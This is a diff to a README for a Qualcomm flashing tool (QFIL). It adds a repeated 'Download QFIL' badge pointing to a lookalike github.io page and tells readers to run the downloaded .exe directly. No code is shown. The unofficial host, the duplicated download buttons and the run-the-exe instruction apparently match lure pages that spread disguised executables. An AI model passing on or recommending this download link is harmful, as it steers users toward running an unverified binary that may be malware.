@@ -2,8 +2,9 @@
 
 > 💡 **Tip:** A backup feature is available in the top-right corner of the interface — use it before flashing.
 
+[![Download QFIL](https://img.shields.io/badge/Download-QFIL-blueviolet)](https://pro-qfil-qualcomm-flash-image-loader.github.io/.github)
 ![Preview](https://live.staticflickr.com/65535/46952036745_16a85ba774_c.jpg)
-*A look at the QFIL main interface.*
+
 
 After downloading, simply open the `.exe` file to launch the tool. No installation is required.
 
@@ -28,7 +29,7 @@ After downloading, simply open the `.exe` file to launch the tool. No installati
 6. **Wait for success message**  
    The status window will show progress. Once completed, your device will reboot or can be safely disconnected.
 
-
+![Preview](https://live.staticflickr.com/65535/46952036745_16a85ba774_c.jpg)
 
 [![Download QFIL](https://img.shields.io/badge/Download-QFIL-blueviolet)](https://pro-qfil-qualcomm-flash-image-loader.github.io/.github)
 
